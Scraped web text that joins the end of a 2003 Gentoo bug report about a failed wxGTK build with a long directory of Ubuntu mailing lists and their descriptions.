src_compile, Line 74, Exitcode 1  !!! build failed    any ideas? ```  [Comment 1](#c1)  Alastair Tse (RETIRED)   gentoo-dev  2003-09-02 14:01:28 UTC  ``` that seems weird, haven't seen this before.  can you try merging wxGTK again? ```  [Comment 2](#c2)  Alastair Tse (RETIRED)   gentoo-dev  2003-09-28 03:38:36 UTC  ``` can't reproduce this. need more info from reporter ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=25132)
* - [XML](show_bug.cgi?ctype=xml&id=25132)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=25132)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=25132&product=Gentoo%20Linux)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=25132&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=25132&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from lists.ubuntu.com_7341ebd6_20250126_094923.html ===

[![](http://assets.ubuntu.com/sites/ubuntu/latest/u/img/logos/logo-ubuntu-orange.png)
Mailing lists](http://community.ubuntu.com/)

# Mailing Lists

Below is a listing of all the public mailing lists on lists.ubuntu.com. Click on a list name to get more information about the list, or to subscribe, unsubscribe, and change the preferences on your subscription.

List administrators, you can visit [the list admin overview page](https://lists.ubuntu.com/mailman/admin) to find the management interface for your list.

If you need help with your Ubuntu system, please try one of the [Community Support Lists](#Community+Support) below.
If you are having trouble using the lists themselves, please contact mailman@lists.ubuntu.com.

**Categories**

1. [Ubuntu Announcements](#Ubuntu+Announcements)
2. [Community Support](#Community+Support)
3. [Announcement Lists](#Announcement+Lists)
4. [Development Lists](#Development+Lists)
5. [Quality Assurance and Related Lists](#Quality+Assurance+and+Related+Lists)
6. [Bug Lists](#Bug+Lists)
7. [Package Upload and Automatic Notification Lists](#Package+Upload+and+Automatic+Notification+Lists)
8. [Ubuntu Worldwide LoCo Teams](#Ubuntu+Worldwide+LoCo+Teams)
9. [Localization Lists](#Localization+Lists)
10. [Other Ubuntu Projects and Groups](#Other+Ubuntu+Projects+and+Groups)
11. [Bazaar-related Lists](#Bazaar-related+Lists)
12. [Storm Lists](#Storm+Lists)
13. [Discontinued (Historical) Lists](#Discontinued+%28Historical%29+Lists)

## Ubuntu Announcements

* [ubuntu-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-announce) -
  Ubuntu Announcements

## Community Support

* [ubuntu-users](http://lists.ubuntu.com/mailman/listinfo/ubuntu-users) -
  Ubuntu user technical support, not for general discussions
* [edubuntu-users](http://lists.ubuntu.com/mailman/listinfo/edubuntu-users) -
  Edubuntu Users Help and Discussion
* [kubuntu-users](http://lists.ubuntu.com/mailman/listinfo/kubuntu-users) -
  Kubuntu user technical support
* [launchpad-users](http://lists.ubuntu.com/mailman/listinfo/launchpad-users) -
  Discussion for Launchpad users
* [lubuntu-users](http://lists.ubuntu.com/mailman/listinfo/Lubuntu-users) -
  Lubuntu Help and User Discussions
* [ubuntu-studio-users](http://lists.ubuntu.com/mailman/listinfo/ubuntu-studio-users) -
  Ubuntu Studio Users
* [ubuntukylin-users](http://lists.ubuntu.com/mailman/listinfo/Ubuntukylin-users) -
  Ubuntu Kylin Support and User Discussions
* [xubuntu-users](http://lists.ubuntu.com/mailman/listinfo/xubuntu-users) -
  Xubuntu Support and User Discussions

## Announcement Lists

* [bazaar-announce](http://lists.ubuntu.com/mailman/listinfo/bazaar-announce) -
  Announcements for the Bazaar project
* [community-announce](http://lists.ubuntu.com/mailman/listinfo/Community-announce) -
  Community announcement list
* [fwts-announce](http://lists.ubuntu.com/mailman/listinfo/Fwts-announce) -
  Firmware Test Suite Announcements
* [kernel-sru-announce](http://lists.ubuntu.com/mailman/listinfo/Kernel-sru-announce) -
  For announcement of things impacting the kernel sru cycle
* [launchpad-announce](http://lists.ubuntu.com/mailman/listinfo/Launchpad-announce) -
  Launchpad.net Announcements
* [snapcraft-announce](http://lists.ubuntu.com/mailman/listinfo/Snapcraft-announce) -
  To coordinate snapd packaging notifications
* [ubuntu-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-announce) -
  Ubuntu Announcements
* [ubuntu-cloud-announce](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cloud-announce) -
  Official announcements about Ubuntu Cloud and Guests
* [ubuntu-devel-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-devel-announce) -
  Developer-related announcements and information
* [ubuntu-mirrors-announce](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mirrors-announce) -
  Ubuntu Mirror Announcement List
* [ubuntu-news](http://lists.ubuntu.com/mailman/listinfo/ubuntu-news) -
  News about Ubuntu interesting to users and developers alike
* [ubuntu-security-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce) -
  Ubuntu Security Announcements

The mailing list snapcraft is private and not meant to be indexed.
## Development Lists

* [ubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-devel) -
  Ubuntu Development (developers)
* [ubuntu-devel-discuss](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-devel-discuss) -
  Ubuntu Development (users and developers)
* [checkbox-devel](http://lists.ubuntu.com/mailman/listinfo/Checkbox-devel) -
  Checkbox development
* [edubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/edubuntu-devel) -
  Edubuntu Development & Technical Discussion
* [edubuntu-devel-es](http://lists.ubuntu.com/mailman/listinfo/edubuntu-devel-es) -
  Edubuntu Hispanoparlantes
* [fwts-devel](http://lists.ubuntu.com/mailman/listinfo/fwts-devel) -
  Firmware Test Suite Development
* [kernel-team](http://lists.ubuntu.com/mailman/listinfo/kernel-team) -
  Kernel team discussions
* [kubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/kubuntu-devel) -
  Kubuntu Developer Discussion
* [lubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/Lubuntu-devel) -
  Lubuntu development, testing and bug management
* [maas-devel](http://lists.ubuntu.com/mailman/listinfo/Maas-devel) -
  Mailing list for discussing the development of MAAS
* [mir-devel](http://lists.ubuntu.com/mailman/listinfo/Mir-devel) -
  Mir Development
* [ubuntu-accessibility-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility-devel) -
  Ubuntu Accessibility development discussions
* [ubuntu-app-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-app-devel) -
* [ubuntu-archive](http://lists.ubuntu.com/mailman/listinfo/ubuntu-archive) -
  Ubuntu Archive Team discussion and co-ordination
* [ubuntu-desktop](http://lists.ubuntu.com/mailman/listinfo/ubuntu-desktop) -
  Desktop Team co-ordination and discussion
* [ubuntu-distributed-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-distributed-devel) -
  Discussion of the Ubuntu Distributed Development initiative
* [ubuntu-motu](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu) -
  mailing list of the Masters Of The Universe
* [ubuntu-release](http://lists.ubuntu.com/mailman/listinfo/ubuntu-release) -
  Ubuntu release co-ordination and discussion
* [ubuntu-server](http://lists.ubuntu.com/mailman/listinfo/ubuntu-server) -
  Ubuntu Server Development mailing list
* [ubuntu-studio-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-studio-devel) -
  Ubuntu Studio Development
* [ubuntu-utah-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-utah-devel) -
  Ubuntu Test Automation Harness Development discussion, for all those people wanting to contribute test cases and provisioning methods
* [ubuntukylin-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntukylin-devel) -
  Ubuntu Kylin Development Discussion
* [upstart-devel](http://lists.ubuntu.com/mailman/listinfo/upstart-devel) -
  Upstart development
* [xubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/xubuntu-devel) -
  Xubuntu Development Discussion
* [community-web-projects](http://lists.ubuntu.com/mailman/listinfo/community-web-projects) -
  Discussion list for all community web projects including LoCo Team Directory, Summit, Hall of Fame, Django Foundations and the community web themes.

The mailing list laptop-testing-team could not be found!
## Quality Assurance and Related Lists

* [ubuntu-quality](http://lists.ubuntu.com/mailman/listinfo/ubuntu-quality) -
  Ubuntu Quality Assurance (testing and bug triage) discussion list
* [ubuntu-bugsquad](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bugsquad) -
  Discussion about reporting, triaging and working with bugs

## Bug Lists

* [ubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bugs) -
  Ubuntu bug tracker changes - HIGH VOLUME
* [universe-bugs](http://lists.ubuntu.com/mailman/listinfo/universe-bugs) -
  Universe bug tracker changes - HIGH VOLUME
* [desktop-bugs](http://lists.ubuntu.com/mailman/listinfo/desktop-bugs) -
  Desktop bug tracker changes - HIGH VOLUME
* [kubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/kubuntu-bugs) -
  Kubuntu bug tracker changes
* [kernel-bugs](http://lists.ubuntu.com/mailman/listinfo/kernel-bugs) -
  Kernel Bugs tracking
* [ubuntu-accessibility-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility-bugs) -
  Bug contact for the Ubuntu Accessibility Team
* [foundations-bugs](http://lists.ubuntu.com/mailman/listinfo/foundations-bugs) -
  Ubuntu Foundations bug changes
* [ubuntu-openstack-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-openstack-bugs) -
  Ubuntu OpenStack Bug Mail
* [ubuntu-server-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-server-bugs) -
  Server bug tracker changes
* [xubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/Xubuntu-bugs) -
  Xubuntu Bugs Discussion

## Package Upload and Automatic Notification Lists

* [lucid-changes](http://lists.ubuntu.com/mailman/listinfo/Lucid-changes) -
  Lucid Lynx archive upload notification list
* [hardy-changes](http://lists.ubuntu.com/mailman/listinfo/Hardy-changes) -
  Hardy Heron archive upload notification list
* [artful-changes](http://lists.ubuntu.com/mailman/listinfo/Artful-changes) -
  Artful Aardvark changes
* [bionic-changes](http://lists.ubuntu.com/mailman/listinfo/Bionic-changes) -
  Bionic Beaver changes
* [cloud-archive-changes](http://lists.ubuntu.com/mailman/listinfo/Cloud-archive-changes) -
  Medium volume automatic messages of each package change in the cloud archive
* [cloud-tools-changes](http://lists.ubuntu.com/mailman/listinfo/Cloud-tools-changes) -
* [cosmic-changes](http://lists.ubuntu.com/mailman/listinfo/Cosmic-changes) -
  Cosmic changes
* [disco-changes](http://lists.ubuntu.com/mailman/listinfo/Disco-changes) -
  Disco changes
* [eoan-changes](http://lists.ubuntu.com/mailman/listinfo/Eoan-changes) -
  Eoan changes
* [focal-changes](http://lists.ubuntu.com/mailman/listinfo/Focal-changes) -
  Focal changes
* [groovy-changes](http://lists.ubuntu.com/mailman/listinfo/Groovy-changes) -
  Groovy changes
* [hirsute-changes](http://lists.ubuntu.com/mailman/listinfo/Hirsute-changes) -
* [impish-changes](http://lists.ubuntu.com/mailman/listinfo/impish-changes) -
* [jammy-changes](http://lists.ubuntu.com/mailman/listinfo/jammy-changes) -
* [kinetic-changes](http://lists.ubuntu.com/mailman/listinfo/kinetic-changes) -
* [lunar-changes](http://lists.ubuntu.com/mailman/listinfo/lunar-changes) -
  Lunar changes
* [mantic-changes](http://lists.ubuntu.com/mailman/listinfo/mantic-changes) -
  Mantic changes
* [maverick-changes](http://lists.ubuntu.com/mailman/listinfo/Maverick-changes) -
  Maverick Meerkat archive upload notification list
* [natty-changes](http://lists.ubuntu.com/mailman/listinfo/Natty-changes) -
  Natty Narwhal archive upload notification list
* [noble-changes](http://lists.ubuntu.com/mailman/listinfo/noble-changes) -
  Noble changes
* [oneiric-changes](http://lists.ubuntu.com/mailman/listinfo/Oneiric-changes) -
  Oneiric Ocelot archive upload notification list
* [oracular-changes](http://lists.ubuntu.com/mailman/listinfo/oracular-changes) -
  Oracular changes
* [plucky-changes](http://lists.ubuntu.com/mailman/listinfo/plucky-changes) -
  Plucky changes
* [precise-changes](http://lists.ubuntu.com/mailman/listinfo/Precise-changes) -
  Precise Pangolin archive upload notification list
* [quantal-changes](http://lists.ubuntu.com/mailman/listinfo/Quantal-changes) -
  Quantal Quetzal archive upload notification list
* [raring-changes](http://lists.ubuntu.com/mailman/listinfo/Raring-changes) -
  Raring Ringtail archive upload notification list
* [rtm-14.09-changes](http://lists.ubuntu.com/mailman/listinfo/Rtm-14.09-changes) -
  Ubuntu RTM archive upload notification list
* [saucy-changes](http://lists.ubuntu.com/mailman/listinfo/Saucy-changes) -
  Saucy Salamander archive upload notification list
* [trusty-changes](http://lists.ubuntu.com/mailman/listinfo/Trusty-changes) -
  Trusty Tahr archive upload notification list
* [ubuntu-patches](http://lists.ubuntu.com/mailman/listinfo/ubuntu-patches) -
  Ubuntu patch upload notifications - HIGH VOLUME
* [utopic-changes](http://lists.ubuntu.com/mailman/listinfo/Utopic-changes) -
  Utopic Unicorn archive upload notification list
* [vivid-changes](http://lists.ubuntu.com/mailman/listinfo/Vivid-changes) -
  Vivid Vervet archive upload notification list
* [wily-changes](http://lists.ubuntu.com/mailman/listinfo/Wily-changes) -
  Wily Werewolf changes
* [xenial-changes](http://lists.ubuntu.com/mailman/listinfo/Xenial-changes) -
  Xenial Xerus changes
* [yakkety-changes](http://lists.ubuntu.com/mailman/listinfo/Yakkety-changes) -
  Yakkety Yak changes
* [zesty-changes](http://lists.ubuntu.com/mailman/listinfo/Zesty-changes) -
  Zesty Zapus changes

The mailing list edubuntu-quebec is private and not meant to be indexed.
## Ubuntu Worldwide LoCo Teams

* [ubuntu-ae](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ae) -
  Ubuntu UAE Mailing List
* [ubuntu-af](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-af) -
  Afghanistan Ubuntu Loco Team
* [ubuntu-ar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ar) -
  Ubuntu User Group Argentina
* [ubuntu-at](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-at) -
  Ubuntu Austria LoCo Team Mailingliste
* [ubuntu-au](http://lists.ubuntu.com/mailman/listinfo/ubuntu-au) -
  Ubuntu in Australia
* [ubuntu-au-wa](http://lists.ubuntu.com/mailman/listinfo/ubuntu-au-wa) -
  Ubuntu Western Australia Local Community Team list
* [ubuntu-az](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-az) -
  Ubuntu Azerbaijan
* [ubuntu-ba](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ba) -
  Ubuntu LoCo tim Bosne i Hercegovine
* [ubuntu-bd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bd) -
  Ubuntu Bangladesh
* [ubuntu-be](http://lists.ubuntu.com/mailman/listinfo/ubuntu-be) -
  Ubuntu Belgium
* [ubuntu-bf](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bf) -
* [ubuntu-bg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bg) -
  Ubuntu users in Bulgaria
* [ubuntu-bh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bh) -
  Ubuntu users in Bahrain
* [ubuntu-bo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bo) -
  Lista de discusiÃ³n de Bolivia - Ubuntu LoCo Team
* [ubuntu-br](http://lists.ubuntu.com/mailman/listinfo/ubuntu-br) -
  Lista de discussÃ£o da Comunidade Ubuntu Brasil
* [ubuntu-bs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bs) -
* [ubuntu-by](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-by) -
  Ubuntu Belarus Team
* [ubuntu-ca](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ca) -
  The Canadian Ubuntu Users Community
* [ubuntu-cd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-cd) -
  Ubuntu Democratic Republic of Congo
* [ubuntu-ch](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ch) -
  Ubuntu Swiss Users
* [ubuntu-ci](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ci) -
  CommunautÃ© Ivoirienne UBUNTU
* [ubuntu-cl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cl) -
  Ubuntu Chile
* [ubuntu-cm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cm) -
  Ubuntu Cameroon Local Community Team
* [ubuntu-co](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-co) -
  Ubuntu Colombia
* [ubuntu-cr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-cr) -
  Costa Rica Ubuntu LoCoTeam
* [ubuntu-cu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cu) -
  Fraternidad de Ubuntu Cuba
* [ubuntu-cy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cy) -
  Ubuntu-cy LoCo Team
* [ubuntu-de](http://lists.ubuntu.com/mailman/listinfo/ubuntu-de) -
  Ubuntu-Diskussion
* [ubuntu-de-events](http://lists.ubuntu.com/mailman/listinfo/ubuntu-de-events) -
  Ubuntu auf Veranstaltungen im Raum DE.
* [ubuntu-dk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-dk) -
  Dansk mailingliste til det danske Ubuntu LocoTeam til diskussion/koordination af aktiviteter
* [ubuntu-do](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-do) -
  Ubuntu Dominican Republic
* [ubuntu-dz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-dz) -
  Ubuntu Algeria
* [ubuntu-ec](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ec) -
  Ubuntu-EC mailist
* [ubuntu-eg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-eg) -
  Ubuntu Egypt LoCo Team
* [ubuntu-es](http://lists.ubuntu.com/mailman/listinfo/ubuntu-es) -
  Asistencia para usuarios de Ubuntu en Castellano
* [ubuntu-es-es](http://lists.ubuntu.com/mailman/listinfo/ubuntu-es-es) -
  Ubuntu EspaÃ±a
* [ubuntu-et](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-et) -
  Ubuntu Ethiopia
* [ubuntu-fi](http://lists.ubuntu.com/mailman/listinfo/ubuntu-fi) -
  SÃ¤hkÃ¶postilista Ubuntu-keskustelulle (Ubuntu Finland)
* [ubuntu-fr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-fr) -
  Liste de discussion sur Ubuntu
* [ubuntu-ge](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ge) -
  Ubuntu Georgian Users Mailing List
* [ubuntu-gr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-gr) -
  Ubuntu Greece discussion list
* [ubuntu-gt](http://lists.ubuntu.com/mailman/listinfo/ubuntu-gt) -
  Ubuntu Guatemala
* [ubuntu-hk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hk) -
  Ubuntu HK LoCo Team
* [ubuntu-hn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-hn) -
  Ubuntu Honduras
* [ubuntu-hu](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hu) -
  Hungarian LoCo team mailing list
* [ubuntu-id](http://lists.ubuntu.com/mailman/listinfo/ubuntu-id) -
  Ubuntu User Group Indonesia.
* [ubuntu-ie](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ie) -
  Ubuntu Ireland Mailing List
* [ubuntu-in](http://lists.ubuntu.com/mailman/listinfo/ubuntu-in) -
  Ubuntu India Local Community
* [ubuntu-in-ap](http://lists.ubuntu.com/mailman/listinfo/ubuntu-in-ap) -
  Ubuntu Andhra Pradesh Local Community
* [ubuntu-ir](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ir) -
  Ubuntu Iranian Team Mailing List
* [ubuntu-it](http://lists.ubuntu.com/mailman/listinfo/ubuntu-it) -
  Supporto per gli utenti Italiani di Ubuntu
* [ubuntu-jo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-jo) -
  Ubuntu Jordan Local Community Team
* [ubuntu-jp](http://lists.ubuntu.com/mailman/listinfo/ubuntu-jp) -
  Ubuntu Japanese Local Community Team
* [ubuntu-ke](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ke) -
  Ubuntu Kenyan LoCoTeam Mailing List
* [ubuntu-kg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kg) -
  Ubuntu Kyrgyzstan
* [ubuntu-kh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kh) -
  Ubuntu Cambodia
* [ubuntu-ko](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ko) -
  Korean Ubuntu Users Mailing List
* [ubuntu-kur](http://lists.ubuntu.com/mailman/listinfo/ubuntu-kur) -
  Listeya bikarheneren Ubuntu ya kurdi
* [ubuntu-kw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kw) -
* [ubuntu-kz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kz) -
  Ubuntu Kazakstan Loco Team List
* [ubuntu-lb](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lb) -
  Ubuntu Lebanon Location Team
* [ubuntu-lk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lk) -
  Ubuntu Sri Lanka
* [ubuntu-lr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lr) -
  Ubuntu Liberia
* [ubuntu-lt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lt) -
  Ubuntu Lithuania
* [ubuntu-lu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lu) -
  Ubuntu Luxembourgian Users
* [ubuntu-lv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lv) -
  Ubuntu Latvijas kopiena
* [ubuntu-ma](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ma) -
  Ubuntu Moroccan Users
* [ubuntu-md](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-md) -
  Ubuntu Moldova
* [ubuntu-me](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-me) -
  Ubuntu Montenegro Loco Team
* [ubuntu-mg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mg) -
  Ubuntu Madagascar LoCo Team
* [ubuntu-mk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mk) -
  Ubuntu Macedonia LoCo Team
* [ubuntu-ml](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ml) -
  Ubuntu Mali
* [ubuntu-mt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mt) -
  Ubuntu Malta
* [ubuntu-mx](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mx) -
  Lista de correos de la comunidad de Ubuntu Linux en Mexico
* [ubuntu-my](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-my) -
  Malaysian Team Mailing List
* [ubuntu-mz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mz) -
  Ubuntu Mozambique LoCo List
* [ubuntu-na](http://lists.ubuntu.com/mailman/listinfo/ubuntu-na) -
  Ubuntu LoCo Team Namibia Mailing List
* [ubuntu-ne](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ne) -
  Ubuntu Niger
* [ubuntu-ng](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ng) -
  Ubuntu Nigeria
* [ubuntu-ni](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ni) -
  Lista de correos del Grupo Ubuntu Nicaragua.
* [ubuntu-nl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-NL) -
  Nederlandstalige Ubuntu ondersteuning en discussie
* [ubuntu-no](http://lists.ubuntu.com/mailman/listinfo/ubuntu-no) -
  Generell epost-liste for Ubuntu Norge
* [ubuntu-np](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-np) -
  Discussion list for Ubuntu Nepal
* [ubuntu-nz](http://lists.ubuntu.com/mailman/listinfo/ubuntu-nz) -
  Advocacy and discussion about Ubuntu in New Zealand
* [ubuntu-pa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pa) -
  Ubuntu PanamÃ¡
* [ubuntu-pe](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pe) -
  Ubuntu Peruvian LoCo Team
* [ubuntu-pg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pg) -
  Papua New Guinea Ubuntu Users
* [ubuntu-ph](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ph) -
  Mailing List para sa Ubuntu Pilipinas (Philippines)
* [ubuntu-pk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pk) -
  Ubuntu-Linux Pakistan Team
* [ubuntu-pl](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pl) -
  Polska lista dyskusyjna uÂ¿ytkownikÃ³w Ubuntu
* [ubuntu-pr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-PR) -
  Equipo Puerto Rico "LoCo" de Ubuntu
* [ubuntu-ps](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ps) -
  Ø§ÙÙØ§Ø¦ÙØ© Ø§ÙØ¨Ø±ÙØ¯ÙØ© ÙÙØ±ÙÙ Ø£ÙØ¨ÙØªÙ Ø§ÙÙÙØ³Ø·ÙÙÙ
* [ubuntu-pt](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pt) -
  Lista de DiscussÃ£o sobre o Ubuntu
* [ubuntu-qa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-qa) -
  Ubuntu Qatar
* [ubuntu-quebec](http://lists.ubuntu.com/mailman/listinfo/ubuntu-quebec) -
  Ubuntu QuÃ©bec
* [ubuntu-ro](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ro) -
  Lista de discutii a echipei Ubuntu RomÃ¢nia
* [ubuntu-rs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-rs) -
  Ubuntu Serbia Local Community Team
* [ubuntu-ru](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ru) -
  Mailing list for Russian-speaking Ubuntu users
* [ubuntu-sd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sd) -
  Ubuntu Sudan
* [ubuntu-se](http://lists.ubuntu.com/mailman/listinfo/ubuntu-se) -
  Ubuntu Sverige
* [ubuntu-sg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-SG) -
  The Singapore Ubuntu Team
* [ubuntu-si](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-si) -
  Ubuntu Slovenija
* [ubuntu-sn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sn) -
  Ubuntu Senegal
* [ubuntu-sv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sv) -
  Ubuntu El Salvador
* [ubuntu-sy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sy) -
  Ubuntu Syria Mailist
* [ubuntu-tam](http://lists.ubuntu.com/mailman/listinfo/ubuntu-tam) -
  உபுண்டு பயனர் மடலாடற் குழு - தமிழகம்
* [ubuntu-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tn) -
  Ubuntu Tunisian LoCo Team Mailing List
* [ubuntu-tr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-tr) -
  Ubuntu Turkiye Users and Developers List
* [ubuntu-tt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tt) -
  Trinidad and Tobago Loco Team
* [ubuntu-tw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-TW) -
  Ubuntu Taiwan LoCo Team
* [ubuntu-tz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tz) -
  Ubuntu LocoTeam in Tanzania
* [ubuntu-ua](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ua) -
  Ubuntu Ukraine
* [ubuntu-ug](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ug) -
  Ubuntu Uganda
* [ubuntu-uk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-uk) -
  UK Ubuntu Talk
* [ubuntu-us](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us) -
  US LoCo Teams
* [ubuntu-us-ak](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ak) -
  The Alaska Ubuntu Local Community Mailing List
* [ubuntu-us-al](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-al) -
  Alabama LoCo Team
* [ubuntu-us-ar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ar) -
  Ubuntu US Arkansas
* [ubuntu-us-az](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-az) -
  The mailing list for Ubuntu-Arizona LoCo Team
* [ubuntu-us-ca](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ca) -
  Ubuntu US California
* [ubuntu-us-chicago](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-chicago) -
  Ubuntu Chicago Local Community Team Mailing List
* [ubuntu-us-co](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-co) -
  Ubuntu Colorado Local Community Team
* [ubuntu-us-ct](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ct) -
  Ubuntu Connecticut Local Community Team
* [ubuntu-us-dc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-dc) -
  Ubuntu US District of Columbia
* [ubuntu-us-eastcoast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-eastcoast) -
  Ubuntu US East Coast
